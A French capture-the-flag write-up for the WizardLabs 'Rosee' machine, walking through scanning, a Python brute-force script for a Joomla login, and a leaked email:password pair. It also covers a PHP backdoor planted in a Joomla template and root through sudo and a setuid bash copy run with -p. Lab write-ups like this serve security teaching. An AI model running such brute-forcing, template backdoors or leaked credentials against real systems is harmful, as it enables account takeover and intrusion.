# Solution du CTF Rosee de Wizard Labs

Shrubbery
---------

*Rosee* est un CTF de *WizardLabs*, d'une difficulté moyenne annoncée et basé Linux.  

Un scan détaillé (*nmap -T5 -p 22,80,139,445,2003 -A -sC -sV -oA scan 10.1.1.23*) nous indique la présence de l'habituel OpenSSH et son collègue *nginx 1.14.0 (Ubuntu)* sur le port 80.  

Il y a aussi le port 10000 qui fait tourner un autre serveur web :  

```plain
Apache httpd 2.4.29 ((Ubuntu))
```

Pour terminer, le script d'exploration web de Nmap remonte deux adresses emails :  

```plain
| http-grep:
|   (2) http://10.1.1.23:80/:
|     (2) email:
|       + hometowncebu@gmail.com
|_      + info@example.com
```

Troll des champs
----------------

J'ai lancé un *Joomscan* sur le port 10000 puisqu'il fait tourner... Joomla (élémentaire mon cher *Watson* !)  

```plain
    ____  _____  _____  __  __  ___   ___    __    _  _
   (_  _)(  _  )(  _  )(  \/  )/ __) / __)  /__\  ( \( )
  .-_)(   )(_)(  )(_)(  )    ( \__ \( (__  /(__)\  )  (
  \____) (_____)(_____)(_/\/\_)(___/ \___)(__)(__)(_)\_)
            (1337.today)

    --=[OWASP JoomScan
    +---++---==[Version : 0.0.7
    +---++---==[Update Date : [2018/09/23]
    +---++---==[Authors : Mohammad Reza Espargham , Ali Razmjoo
    --=[Code name : Self Challenge
    @OWASP_JoomScan , @rezesp , @Ali_Razmjo0 , @OWASP

Processing http://10.1.1.23:10000/blog/ ...

[+] FireWall Detector
[++] Firewall not detected

[+] Detecting Joomla Version
[++] Joomla 3.8.11

[+] Core Joomla Vulnerability
[++] Target Joomla core is not vulnerable

[+] Checking Directory Listing
[++] directory has directory listing :
http://10.1.1.23:10000/blog/administrator/components
http://10.1.1.23:10000/blog/administrator/modules
http://10.1.1.23:10000/blog/administrator/templates
http://10.1.1.23:10000/blog/images/banners

[+] Checking apache info/status files
[++] Readable info/status files are not found

[+] admin finder
[++] Admin page : http://10.1.1.23:10000/blog/administrator/

[+] Checking robots.txt existing
[++] robots.txt is not found

[+] Finding common backup files name
[++] Backup files are not found

[+] Finding common log files name
[++] error log is not found

[+] Checking sensitive config.php.x file
[++] Readable config files are not found

[+] Enumeration component (com_ajax)
[++] Name: com_ajax
Location : http://10.1.1.23:10000/blog/components/com_ajax/
Directory listing is enabled : http://10.1.1.23:10000/blog/components/com_ajax/

[+] Enumeration component (com_banners)
[++] Name: com_banners
Location : http://10.1.1.23:10000/blog/components/com_banners/
Directory listing is enabled : http://10.1.1.23:10000/blog/components/com_banners/

[+] Enumeration component (com_contact)
[++] Name: com_contact
Location : http://10.1.1.23:10000/blog/components/com_contact/
Directory listing is enabled : http://10.1.1.23:10000/blog/components/com_contact/

[+] Enumeration component (com_content)
[++] Name: com_content
Location : http://10.1.1.23:10000/blog/components/com_content/
Directory listing is enabled : http://10.1.1.23:10000/blog/components/com_content/

[+] Enumeration component (com_contenthistory)
[++] Name: com_contenthistory
Location : http://10.1.1.23:10000/blog/components/com_contenthistory/
Directory listing is enabled : http://10.1.1.23:10000/blog/components/com_contenthistory/

[+] Enumeration component (com_fields)
[++] Name: com_fields
Location : http://10.1.1.23:10000/blog/components/com_fields/
Directory listing is enabled : http://10.1.1.23:10000/blog/components/com_fields/

[+] Enumeration component (com_finder)
[++] Name: com_finder
Location : http://10.1.1.23:10000/blog/components/com_finder/
Directory listing is enabled : http://10.1.1.23:10000/blog/components/com_finder/

[+] Enumeration component (com_mailto)
[++] Name: com_mailto
Location : http://10.1.1.23:10000/blog/components/com_mailto/
Directory listing is enabled : http://10.1.1.23:10000/blog/components/com_mailto/
Installed version : 3.1

[+] Enumeration component (com_media)
[++] Name: com_media
Location : http://10.1.1.23:10000/blog/components/com_media/
Directory listing is enabled : http://10.1.1.23:10000/blog/components/com_media/

[+] Enumeration component (com_newsfeeds)
[++] Name: com_newsfeeds
Location : http://10.1.1.23:10000/blog/components/com_newsfeeds/
Directory listing is enabled : http://10.1.1.23:10000/blog/components/com_newsfeeds/

[+] Enumeration component (com_search)
[++] Name: com_search
Location : http://10.1.1.23:10000/blog/components/com_search/
Directory listing is enabled : http://10.1.1.23:10000/blog/components/com_search/

[+] Enumeration component (com_users)
[++] Name: com_users
Location : http://10.1.1.23:10000/blog/components/com_users/
Directory listing is enabled : http://10.1.1.23:10000/blog/components/com_users/

[+] Enumeration component (com_wrapper)
[++] Name: com_wrapper
Location : http://10.1.1.23:10000/blog/components/com_wrapper/
Directory listing is enabled : http://10.1.1.23:10000/blog/components/com_wrapper/
Installed version : 3.1

Your Report : reports/10.1.1.23:10000/
```

Ensuite viens la tache fastidieuse de déterminer si l'un des plugins est vulnérable... Cela ne m'a mené nul part.  

*Metasploit* dispose d'un module de scan *scanner/http/joomla\_plugins* mais il semble générer de nombreux faux positifs.  

J'ai ensuite lancé Wapiti avec les modules Nikto et buster histoire de trouver des fichiers ou dossiers intéressants :  

```plain
$ ./bin/wapiti -u http://10.1.1.23:10000/ -m "buster,nikto"

     __    __            _ _   _ _____
    / / /\ \ \__ _ _ __ (_) |_(_)___ /
    \ \/  \/ / _` | '_ \| | __| | |_ \
     \  /\  / (_| | |_) | | |_| |___) |
      \/  \/ \__,_| .__/|_|\__|_|____/
                  |_|
Wapiti-3.0.0 (wapiti.sourceforge.net)
[*] Enregistrement de l'état du scan, veuillez patienter...

 Note
========
Ce scan a été sauvé dans le fichier /home/devloop/.wapiti/scans/10.1.1.23_10000_folder_9b794f55.db
[*] Wapiti a trouvé 1 URLs et formulaires lors du scan
[*] Chargement des modules :
     mod_crlf, mod_exec, mod_file, mod_sql, mod_xss, mod_backup, mod_htaccess, mod_blindsql, mod_permanentxss, mod_nikto, mod_delay, mod_buster, mod_shellshock

[*] Lancement du module nikto
---
This might be interesting...
http://10.1.1.23:10000/administrator/
Références
  http://osvdb.org/show/osvdb/3092
---
---
Apache default file found.
http://10.1.1.23:10000/icons/README
Références
  http://osvdb.org/show/osvdb/3233
---

[*] Lancement du module buster
Found webpage http://10.1.1.23:10000/administrator/
Found webpage http://10.1.1.23:10000/blog/
Found webpage http://10.1.1.23:10000/administrator/logs/
Found webpage http://10.1.1.23:10000/blog/images/
Found webpage http://10.1.1.23:10000/blog/index.php
Found webpage http://10.1.1.23:10000/blog/templates/
Found webpage http://10.1.1.23:10000/blog/plugins/
Found webpage http://10.1.1.23:10000/blog/includes/
Found webpage http://10.1.1.23:10000/blog/language/
Found webpage http://10.1.1.23:10000/blog/modules/
Found webpage http://10.1.1.23:10000/blog/cache/
Found webpage http://10.1.1.23:10000/blog/media/
Found webpage http://10.1.1.23:10000/blog/tmp/
Found webpage http://10.1.1.23:10000/blog/administrator/
Found webpage http://10.1.1.23:10000/blog/libraries/
Found webpage http://10.1.1.23:10000/blog/README.txt
Found webpage http://10.1.1.23:10000/blog/components/
Found webpage http://10.1.1.23:10000/blog/configuration.php
Found webpage http://10.1.1.23:10000/blog/htaccess.txt
Found webpage http://10.1.1.23:10000/blog/bin/
Found webpage http://10.1.1.23:10000/blog/LICENSE.txt
Found webpage http://10.1.1.23:10000/blog/cli/
Found webpage http://10.1.1.23:10000/blog/layouts/
Found webpage http://10.1.1.23:10000/administrator/logs/error.php
Found webpage http://10.1.1.23:10000/blog/images/banners/
Found webpage http://10.1.1.23:10000/blog/images/headers/
Found webpage http://10.1.1.23:10000/blog/images/sampledata/
Found webpage http://10.1.1.23:10000/blog/templates/system/
Found webpage http://10.1.1.23:10000/blog/plugins/user/
Found webpage http://10.1.1.23:10000/blog/plugins/system/
Found webpage http://10.1.1.23:10000/blog/plugins/search/
Found webpage http://10.1.1.23:10000/blog/plugins/editors/
Found webpage http://10.1.1.23:10000/blog/plugins/content/
Found webpage http://10.1.1.23:10000/blog/plugins/installer/
Found webpage http://10.1.1.23:10000/blog/plugins/captcha/
Found webpage http://10.1.1.23:10000/blog/plugins/authentication/
Found webpage http://10.1.1.23:10000/blog/plugins/fields/
Found webpage http://10.1.1.23:10000/blog/plugins/sampledata/
Found webpage http://10.1.1.23:10000/blog/plugins/extension/
Found webpage http://10.1.1.23:10000/blog/includes/framework.php
Found webpage http://10.1.1.23:10000/blog/includes/defines.php
Found webpage http://10.1.1.23:10000/blog/language/overrides/
Found webpage http://10.1.1.23:10000/blog/modules/mod_login/
Found webpage http://10.1.1.23:10000/blog/modules/mod_search/
Found webpage http://10.1.1.23:10000/blog/modules/mod_custom/
Found webpage http://10.1.1.23:10000/blog/modules/mod_footer/
Found webpage http://10.1.1.23:10000/blog/modules/mod_feed/
Found webpage http://10.1.1.23:10000/blog/modules/mod_stats/
Found webpage http://10.1.1.23:10000/blog/modules/mod_banners/
Found webpage http://10.1.1.23:10000/blog/modules/mod_syndicate/
Found webpage http://10.1.1.23:10000/blog/modules/mod_random_image/
Found webpage http://10.1.1.23:10000/blog/modules/mod_wrapper/
Found webpage http://10.1.1.23:10000/blog/modules/mod_breadcrumbs/
Found webpage http://10.1.1.23:10000/blog/modules/mod_whosonline/
Found webpage http://10.1.1.23:10000/blog/modules/mod_related_items/
Found webpage http://10.1.1.23:10000/blog/modules/mod_menu/
Found webpage http://10.1.1.23:10000/blog/media/system/
Found webpage http://10.1.1.23:10000/blog/media/media/
Found webpage http://10.1.1.23:10000/blog/media/com_content/
Found webpage http://10.1.1.23:10000/blog/media/com_contact/
Found webpage http://10.1.1.23:10000/blog/media/editors/
Found webpage http://10.1.1.23:10000/blog/media/com_wrapper/
Found webpage http://10.1.1.23:10000/blog/media/com_menus/
Found webpage http://10.1.1.23:10000/blog/media/mailto/
Found webpage http://10.1.1.23:10000/blog/media/com_modules/
Found webpage http://10.1.1.23:10000/blog/media/cms/
Found webpage http://10.1.1.23:10000/blog/media/contacts/
Found webpage http://10.1.1.23:10000/blog/administrator/index.php
Found webpage http://10.1.1.23:10000/blog/administrator/templates/
Found webpage http://10.1.1.23:10000/blog/administrator/includes/
Found webpage http://10.1.1.23:10000/blog/administrator/language/
Found webpage http://10.1.1.23:10000/blog/administrator/modules/
Found webpage http://10.1.1.23:10000/blog/administrator/cache/
Found webpage http://10.1.1.23:10000/blog/administrator/logs/
Found webpage http://10.1.1.23:10000/blog/administrator/help/
Found webpage http://10.1.1.23:10000/blog/administrator/components/
```

La seule chose qui ressort c'est ce fichier */administrator/logs/error.php* mais l'attaquer avec *sqlmap* ou tenter de brute-forcer des noms de paramètres avec *Patator* n'ont mené là encore nul part.  

It's all about OSINT you fool!
------------------------------

Si on recherche l'adresse email remontée par Nmap via Google on trouve [ce leak](https://pastebin.pl/view/f1b64ad3) avec les creds suivants :  

```plain
hometowncebu@gmail.com:cabergas08
```

J'ai écrit mon propre script de brute-force pour Joomla :  

```python
import sys

import requests
from requests.exceptions import RequestException
from bs4 import BeautifulSoup

userfile = sys.argv[1]
passfile = sys.argv[2]

sess = requests.session()

with open(passfile, errors="ignore") as fdpass:
    for password in fdpass:
        password = password.strip()
        print("Testing password", password)

        with open(userfile, errors="ignore") as fduser:
            for username in fduser:
                username = username.strip()

                fields = {}
                response = sess.get("http://10.1.1.23:10000/blog/index.php/author-login")
                soup = BeautifulSoup(response.text, "lxml")
                form = soup.find("form", action="/blog/index.php/author-login?task=user.login")

                for field in form.find_all("input", attrs={"name": True}):
                    fields[field["name"]] = field.get("value", "")

                fields["username"] = username
                fields["password"] = password
                response = sess.post(
                    "http://10.1.1.23:10000/blog/index.php/author-login?task=user.login",
                    data=fields,
                    headers={"Referer": "http://10.1.1.23:10000/blog/index.php/author-login"}
                )

                if "Username and password do not match" not in response.text:
                    print("Got no error and status code {} with {} / {}".format(response.status_code, username, password))
                    sess = requests.session()
```

On met ensuite des versions possibles du nom d'utilisateur dans un fichier et le pass dans un autre :  

```plain
$ python3 brute.py /tmp/users.txt /tmp/passwords.txt
Testing password cabergas08
Got no error and status code 200 with cebu / cabergas08
```

L'étape suivante est de modifier un script PHP du template Joomla via *control panel > templates > templates > protostar* (ce dernier étant le nom du template utilisé).  

![WizardLabs CTF Rosee joomla template injection PHP backdoor](https://raw.githubusercontent.com/devl00p/blog/master/images/wizard-labs/rosee_joomla_template_edit.png)

On obtient facilement un shell en tant que *www-data* et via la réutilisation du mot de passe l'accès au compte *cebu* (et le premier flag).  

```plain
www-data@rosee:/var$ su cebu
Password:
cebu@rosee:/var$ id
uid=1000(cebu) gid=1000(cebu) groups=1000(cebu),4(adm),24(cdrom),30(dip),46(plugdev),116(lpadmin),126(sambashare)
```

Ni une ni deux :  

```plain
cebu@rosee:/var$ sudo -l
[sudo] password for cebu:
Matching Defaults entries for cebu on rosee:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User cebu may run the following commands on rosee:
    (ALL : ALL) ALL
cebu@rosee:/var$ sudo su
root@rosee:/var# cd /root
root@rosee:~# cat root.txt
adb23419c67f23540fca29392de30177984a17a4
```

I read your mails
-----------------

Il y a un autre chemin vers root, plus intéressant :  

```plain
cebu@rosee:~$ cat /var/spool/mail/cebu
From: CEO <ceo@localhost>
To: Cebu <cebu@localhost>
Subject: Rootkit attack + Data breach

Hey Cebu . Since the hosting platform where our website is hosted has been hacked and a rootkit has been installed in our server .
Fortunately , I removed it but can you verify if that rootkit which spawns a shell  hasn't corrupted or backdoored any file or binary ??
And if nobody can't spawn  a root shell easily ?

Greetings .
```

Il y a en effet un binaire setuid :  

```plain
[+] World-writable SUID files owned by root:
-rwsrwxrwx 1 root root 1113504 Aug  9 15:26 /usr/bin/sudo.old
```

Comme vu sur un autre CTF toute tentative de modifier un binaire avec ce flag va retirer son bit setuid (pas bête les penguins)...  

Ce binaire ne semble pas donner de shell root... à première vue :  

```plain
www-data@rosee:/var/www/admin/blog/templates/protostar$ sudo.old
sudo.old-4.4$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

C'est simplement parce que le binaire est une copie de bash et que ce programme droppe par défaut ses privilèges. Il suffit alors de l'appeler avec l'option -p :  

```plain
www-data@rosee:/var/www/admin/blog/templates/protostar$ sudo.old -p
sudo.old-4.4# id
uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)
```

Effective UID is effective !

*Published November 17 2020 at 14:29*